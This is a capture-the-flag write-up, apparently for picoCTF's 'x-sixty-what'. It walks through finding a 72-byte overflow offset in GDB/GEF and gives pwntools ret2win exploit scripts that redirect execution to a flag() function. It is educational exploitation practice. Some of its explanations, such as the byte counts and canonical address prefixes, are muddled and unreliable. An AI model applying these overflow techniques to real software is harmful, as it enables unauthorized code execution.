
### Finding offset using GDB
In x64-systems, you cannot overwrite the instruction pointer `rip`  as easily as with x86 systems. This is mostly because of the canonical address ranges:
`0000'0000` to `00007FFF'FFFFFFFF`, and `FFFF8000'00000000` to `FFFFFFFF'FFFFFFFF`
So the first bytes either have to be `00007F`, or `FFFFF`.
If the overflown address is not canonical, it won't enter into the `rip` in the first place.
Because the addresses in little-endian encoding are read right-to-left, make sure to only overwrite 6 `\x` charactes. (12 bytes)

To find the offset, overflow the buffer and find the pattern of `$rsp`. Then for the overwriting, add 6 characters. to keep the offset.
```
┌─[root@edu-virtualbox]─[/home/edu/picoctf/x_sixty_what]
└──╼ #gdb ./vuln 
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
[+] Saved as '$_gef0'
gef➤  
```

After this, the program will crash. to find the offset, we check the offset of the `$rsp`. In the next 6 characters, you can modify the return address.
```
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$rax   : 0x007fffffffe130  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x0               
$rcx   : 0x007ffff7fa6980  →  0x00000000fbad2288
$rdx   : 0x0               
$rsp   : 0x007fffffffe178  →  "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x000000004052a0  →  "\naaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag[...]"
$rdi   : 0x007ffff7fa89a0  →  0x0000000000000000
$rip   : 0x000000004012d1  →  <vuln+31> ret 
$r8    : 0x007fffffffe130  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$r9    : 0x007fffffffe180  →  "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
$r10   : 0x6e              
$r11   : 0x246             
$r12   : 0x00000000401150  →  <_start+0> endbr64 
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x007fffffffe178│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"      ← $rsp
0x007fffffffe180│+0x0008: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"      ← $r9
0x007fffffffe188│+0x0010: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
0x007fffffffe190│+0x0018: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
0x007fffffffe198│+0x0020: "naaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaata[...]"
0x007fffffffe1a0│+0x0028: "oaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaaua[...]"
0x007fffffffe1a8│+0x0030: "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"
0x007fffffffe1b0│+0x0038: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     0x4012ca <vuln+24>        call   0x401100 <gets@plt>
     0x4012cf <vuln+29>        nop    
     0x4012d0 <vuln+30>        leave  
 →   0x4012d1 <vuln+31>        ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] Id 1, Name: "vuln", stopped 0x4012d1 in vuln (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] 0x4012d1 → vuln()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search) 
```
So the buffer will be 72 characters, after which 6 will be the address of the `flag()` function.

### General information about the binary

```
#!/usr/bin/env python3
import pwn

elf = pwn.ELF('./vuln')
print(elf)
print(hex(elf.symbols["flag"]))
```
Output:
```
┌─[root@edu-virtualbox]─[/home/edu/picoctf/x_sixty_what]
└──╼ #python3 exploit.py 
[*] '/home/edu/picoctf/x_sixty_what/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
ELF('/home/edu/picoctf/x_sixty_what/vuln')
0x401236
```

So the location of the `flag()` function is at `0x401236`

Now for the exploitation:
First, you create a `pwn.process()` of the binary.
Then, you create the padding, using 72 arbitrary bytes as the buffer, then the `p32()`-packed `0x401236` address.

Local code:
```
#!/usr/bin/env python3
import pwn

elf = pwn.ELF('./vuln')
p = elf.process()

print(p.recv())
win_location = pwn.p32(0x401236)

payload = b"".join(
        [
                b"A" * 72,
                win_location,
        ]
)
p.send(payload)
p.interactive()
```

For this specific CTF, the online version was a bit different from the local one, as they have made it that the `0x401236` address won't work. 
So I tried a few different addresses, and `0x40123B` worked.

Final code:
```
#!/usr/bin/env python3
import pwn

elf = pwn.ELF('./vuln')
p = elf.process()

print(p.recv())
win_location = pwn.p32(0x40123b)

payload = b"".join(
        [
                b"A" * 72,
                win_location,
        ]
)
p.send(payload)
p.interactive()
